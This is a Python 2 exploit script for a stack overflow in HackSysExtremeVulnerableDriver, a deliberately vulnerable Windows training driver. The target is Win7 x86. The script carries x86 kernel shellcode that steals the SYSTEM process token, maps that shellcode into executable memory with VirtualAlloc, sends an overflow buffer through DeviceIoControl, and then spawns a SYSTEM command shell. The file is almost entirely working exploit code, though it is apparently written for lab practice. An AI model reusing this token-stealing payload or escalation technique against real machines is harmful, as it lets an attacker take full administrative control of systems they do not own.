#Written By: Eric Van Zutphen
#Purpose: Win7 x86 HEVD Stack Overflow DEP Bypass

import ctypes, sys, struct
from subprocess import *
from ctypes import *


#Set the kernel32 dll
kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
		print '[+] Could not get handle. [*]'
		sys.exit(0)

#This will define the IOCTL
IOCTL = hex((0x00000022 << 16) | (0x00000000 << 14) | (0x800 << 2) | 0x00000003)
print "\n[*]     CTL code is: " + IOCTL + "      [*]" 


#System Token Stealing Payload
print "[*]     Stealing SYSTEM Token      [*]"

shellcode = ""
shellcode += bytearray(    
        "\x60"                            # pushad
        "\x31\xc0"                        # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]         |Offset to _EProcess
        "\x89\xc1"                        # mov ecx,eax                |Copy _EProcess into ecx
        "\xba\x04\x00\x00\x00"            # mov edx,0x4                |SYSTEM PID Always 4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]         |Search for SYSTEM Process
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8 
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx         |Compare if PID == 4
        "\x75\xed"                        # jnz 0x1a                   |Jump Back to Search Function if PID != 4
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]         |Copy SYSTEM Token into EDX
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx         |Overwrite with System Token
        "\x61"                            # popad
        "\x31\xc0"                        # xor eax,eax
        "\x5d"                            # pop ebp                    |Restore Original Resgisters to Resume Execution Flow
        "\xc2\x08\x00"                    # ret 0x8
)

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => None                         #
#   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
#   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
#   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
# );                                                                  #
#---------------------------------------------------------------------#
print "[*]  VirtualAlloc() to Bypass DEP  [*]"
ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
final_exploit = struct.pack("<L",ptr)

print "[*]      Sending Exploit!!!        [*]"
exploit = 'A' * 2080 + final_exploit
explLength = len(exploit)
kernel32.DeviceIoControl(hevDevice, 0x222003, exploit, explLength, None, 0, byref(c_ulong()), None)
print "[*]   Popping a NT/System Shell!!! [*]"
Popen("start cmd", shell=True)
